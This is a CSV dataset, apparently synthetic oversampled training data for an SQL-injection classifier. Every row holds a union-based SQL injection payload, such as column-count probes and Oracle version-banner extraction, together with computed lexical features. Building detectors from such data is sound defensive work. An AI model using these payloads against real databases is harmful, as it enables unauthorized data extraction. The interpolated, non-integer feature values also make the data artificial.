id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000148,attack,union," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000037,0.15595268920791747,100.24716345729958,26.0,4.0386930118702775,63.66288460973277,4.584278847566807,24.0,8.0,0.6349080453566024,0.04581182299689207,0.2394600987348792,0.07982003291162641,0.0,0.0,2.0,0.0,1.0,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000149,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R000284,1.2929652439942763,56.21680498893894,20.87413555063953,3.8504597909390172,31.251728898720945,8.028008314898234,11.0,5.937067775319764,0.5651014275285707,0.13311463662855266,0.1969152412111197,0.10486869463175695,1.0,0.0,2.468533887659882,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.468533887659882,2.468533887659882,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000150,attack,union,"-2333' union all select 9714,9714,9714--",nearest_attack_euclidean,R000162,0.07430193320132192,40.0,20.0,4.121983558146458,14.0,16.0,4.0,6.0,0.35,0.4,0.1,0.15,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,2.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000151,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R000255,0.06137538347974499,61.475938752714406,20.03172925018096,3.642921563812596,14.0,32.38075100217152,4.0,11.095187750542882,0.2280709356044,0.52631487727472,0.0651631244584,0.18045106266248,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,6.095187750542881,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000152,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000022,0.0,97.0,27.0,3.7712694510833757,49.0,3.0,33.0,12.0,0.5051546391752577,0.030927835051546393,0.3402061855670103,0.12371134020618557,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000153,attack,union,"-8042  )   as zhoq where 2120  =  2120 union all select 2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--",nearest_attack_euclidean,R000210,0.5926606645391211,107.21759423402091,25.65278270206269,3.752595803645092,25.0,52.0,16.0,14.217594234020897,0.2331741211621216,0.48500217201721296,0.14923143754375784,0.13259226927690754,0.2175942340208974,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,9.0,4.0,0.2175942340208975,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000154,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R000135,0.9784515552391037,101.8964543266292,29.62070913467416,4.247867859968045,37.0,33.51716346130335,17.0,14.379290865325839,0.36505561625978183,0.3264143356629857,0.1677282561193592,0.1408017919578732,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,4.379290865325837,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000155,attack,union,"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",nearest_attack_euclidean,R000257,0.585732223294209,120.46670144681323,29.39556019290843,4.207964105004627,37.0,48.37336115745058,17.0,18.093340289362644,0.3081986942885753,0.40017466686887526,0.14160480548394,0.1500218333586094,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,8.093340289362645,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000156,attack,union,"-6200'   )    )    as jjpz where 4490  =  4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",nearest_attack_euclidean,R000212,0.28557834450068664,113.79600566210861,27.240798867578278,3.767586565577885,25.0,51.03680452968689,22.0,15.759201132421722,0.2197707397982043,0.44836681632287306,0.1933982510224198,0.1384641928565028,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,8.759201132421722,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000157,attack,union,"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",nearest_attack_euclidean,R000107,0.2916311572143177,89.96742566020555,26.590227698061664,4.0072890900395866,29.0,33.57394052816444,15.0,12.39348513204111,0.3229295751222216,0.3723967005278169,0.1670325388563215,0.13764118549363996,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,4.39348513204111,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000158,attack,union,"-7065'+  (  select 'bdxr' where 1756  =  1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",nearest_attack_euclidean,R000136,0.36641315283945725,110.00997406334596,29.0,4.054614319447494,29.0,49.60797925067676,15.0,16.40199481266919,0.2644672884380501,0.44980883186134046,0.13679342505416386,0.1489304546464455,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,8.40199481266919,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000159,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000113,0.28325647903638007,92.03626037123158,30.407252074246315,4.325951275707952,37.0,25.62900829698526,17.0,12.407252074246314,0.40305366764884604,0.2771195662933889,0.18518682027109143,0.13463994578667363,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,2.4072520742463146,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000160,attack,union,"-9583%""   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--",nearest_attack_euclidean,R000177,0.10567301330615589,73.42629200949756,21.170516803799025,3.65344651088523,14.0,32.34103360759805,14.0,13.085258401899512,0.19073268561064877,0.440332649991348,0.19073268561064877,0.17820197878735441,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,2.0,1.0,0.0,6.085258401899512,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000161,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000125,0.5623048353070006,94.09323395466181,24.818646790932362,3.857399955433893,25.0,35.27458716372945,22.0,11.818646790932362,0.2669491165220587,0.3728814135647061,0.23491522253941166,0.12525424737382357,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,4.8186467909323625,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000162,attack,union,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",nearest_attack_euclidean,R000291,0.23467508087859848,93.26818531347627,26.0,3.955886945783993,25.0,34.61454825078101,22.0,11.653637062695253,0.2685195501130766,0.3703687198190775,0.23629720409950739,0.12481452596833856,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,4.653637062695253,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000163,attack,union,"-9932"" union all select 4049,4049,4049--",nearest_attack_euclidean,R000192,0.0565625627658641,39.768681854972925,19.046263629005416,3.9471787490669668,14.0,15.814945483978338,4.0,5.9537363709945845,0.35231318145027074,0.39735636405683344,0.10066090898579165,0.14966954550710418,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,1.953736370994585,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000164,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000170,0.33998887099330677,58.529035738971174,21.168602382598078,3.9915295077419,14.0,30.023228591176945,4.0,10.505807147794236,0.24109494458108738,0.5106860665026951,0.06888426988031068,0.1793347190359068,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,5.505807147794236,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000165,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000176,0.4052204098167875,65.18552369971104,19.0,3.605058284661734,45.54841895976883,1.0,11.0,7.637104739942208,0.6945126728486066,0.01598292835627174,0.17581221191898905,0.11369218687613264,1.0,0.0,2.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,3.6371047399422087,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000166,attack,union,"-5595""   )    )    as xttj where 4562  =  4562 union all select 4562,4562,4562,4562,4562#",nearest_attack_euclidean,R000297,0.34337774432421997,91.45390891269192,27.490781782538384,3.9693481770994494,25.0,33.96312713015354,22.0,10.490781782538384,0.27356589495370576,0.37104867671258945,0.24073798755926104,0.11464744077444382,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,4.490781782538384,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000167,attack,union,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",nearest_attack_euclidean,R000103,0.07556565617036524,60.0,19.19512857075005,3.773501857156111,14.0,32.0,4.0,10.0,0.23333333333333334,0.5333333333333333,0.06666666666666667,0.16666666666666666,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,6.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000168,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000302,0.0930453649054698,84.70540163510191,27.07054016351019,4.1264548594527675,29.0,28.56432130808152,15.0,12.14108032702038,0.34264733442021844,0.3368353272664633,0.1772313798725268,0.14328595844079142,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,3.14108032702038,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000169,attack,union," select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000024,0.025882704966396716,100.73466378923078,25.0,3.9855362534550975,65.78773103138462,3.053067242153844,24.893865515692312,7.0,0.6530603366419777,0.030337850669332256,0.2471033232625984,0.06949848942609164,0.0,0.0,2.0,0.0,1.0,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000170,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000165,0.4850806536064419,95.98102601091318,27.0,3.9764383129407026,25.0,40.99367533697106,17.490513005456588,12.49683766848553,0.26118528927057555,0.42736003747074053,0.1813539470898978,0.1301007261687861,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.2484188342427647,0.0,0.0,6.248418834242765,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000171,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000197,0.45618783198946544,84.76621955853227,26.24304876062903,3.9677208485369757,25.0,32.0,17.513902478741944,10.252317079790323,0.2952937765778706,0.3779760340196744,0.20580915566252544,0.12092103373992961,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.2523170797903238,0.0,0.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000172,attack,union,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",nearest_attack_euclidean,R000103,0.14600565630392096,58.929389324943884,19.0,3.772672583321577,14.0,31.143511459955107,4.0,9.785877864988777,0.23787531801538958,0.5281424936966976,0.06796437657582559,0.16601781171208718,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,5.785877864988777,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000173,attack,union,"-5322"" union all select 6494,6494,6494,6494,6494,6494--",nearest_attack_euclidean,R000215,0.1418823124250481,53.96070505835124,20.0,3.807099633644667,14.0,27.168564046680988,4.0,8.792141011670248,0.25983641061203006,0.5030441021576799,0.07423897446058,0.16288051276971,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,4.792141011670247,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000174,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000293,0.006475704750233444,98.96731681156467,28.99673168115647,4.18991990224959,36.973853449251735,32.0,16.993463362312934,13.0,0.37358083866167624,0.3233510228157906,0.17170678550361831,0.13136135301891494,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,4.0,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.996731681156467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.996731681156467
SMOTE_000175,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000173,1.1250508730098718,43.10467023257126,20.348840034455,3.92087413777402,18.38373011197875,10.697680068910001,9.01163002584125,5.01163002584125,0.4221704149234715,0.24439911305803763,0.2167589484175663,0.11667152360092455,0.33721000861375017,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.6744200172275003,3.0,0.3372100086137501,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000176,attack,union,"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",nearest_attack_euclidean,R000077,1.5776334307636828,70.0,22.591077712719454,3.7603864208443922,14.0,40.0,4.0,12.0,0.2,0.5714285714285714,0.05714285714285715,0.17142857142857143,0.40892228728054625,0.5910777127194538,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,8.0,1.0,0.40892228728054625,0.5910777127194538,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000177,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000161,0.26377872423267884,85.0094527849986,19.0,3.4317470495397413,61.40756222799888,1.0,11.0,11.60189055699972,0.7214886848923152,0.011895653804194661,0.13085219184614144,0.13576346945734874,1.0,0.0,2.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,7.601890556999722,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000178,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000006,0.30103056582506227,111.57299274750868,27.85766424916956,3.9687944962612405,65.43065699667824,4.142335750830437,32.0,10.0,0.5863709094276204,0.037160028923900246,0.28683357077979377,0.08963549086868555,0.0,0.0,2.0,0.0,1.14233575083044,2.0,0.0,2.0,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000179,attack,union,"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",nearest_attack_euclidean,R000240,0.2155809629465391,58.850257805507944,19.22994843889841,3.6765296743419547,14.0,31.08020624440635,4.0,9.770051561101589,0.2382110274917845,0.5277588257236748,0.06806029356908128,0.16596985321545935,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,5.770051561101588,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
